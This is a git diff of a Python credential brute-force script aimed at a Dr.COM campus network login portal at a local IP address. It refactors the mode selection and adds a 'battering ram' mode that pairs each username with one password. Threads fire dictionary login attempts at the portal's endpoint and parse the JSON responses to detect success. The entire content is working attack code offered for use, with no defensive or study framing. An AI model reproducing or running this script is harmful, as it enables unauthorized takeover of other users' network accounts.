@@ -29,7 +29,6 @@ def brute(session, username: str, password: str):
     r = session.get(url=url, headers=headers, verify=False)
     print(str(r.status_code) + '\t' + str(len(r.text)) + '\t' +
           username + '\t' + password + '\t', end='\t')
-    # print(r.text)
     s = re.findall(r'\((.*?)\)', r.text)
     j = json.loads(s[0])
     status = j['result']
@@ -40,8 +39,7 @@ def brute(session, username: str, password: str):
             session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
 
 
-if __name__ == '__main__':
-    mode = 1
+def choose_mode(mode:int):
     dic_username = dump_username()
     dic_password = dump_password()
     session = requests.session()
@@ -57,9 +55,22 @@ if __name__ == '__main__':
             for password in dic_password:
                 t = threading.Thread(target=brute, args=(session, username, dic_password[i]))
                 i += 1
+                #设置轮回数
                 if i == 122:
                     for j in range(i):
                         dic_password.pop(0)
                     break
                 t.start()
                 time.sleep(0.005)
+    elif mode == 3:
+        for username in dic_username:
+            t = threading.Thread(target=brute, args=(session, username, dic_password[0]))
+            dic_password.pop(0)
+            t.start()
+            time.sleep(0.005)
+     
+
+if __name__ == '__main__':
+    #mode=1,2:cluster bomb
+    #mode=3:battering ram
+    choose_mode(3)
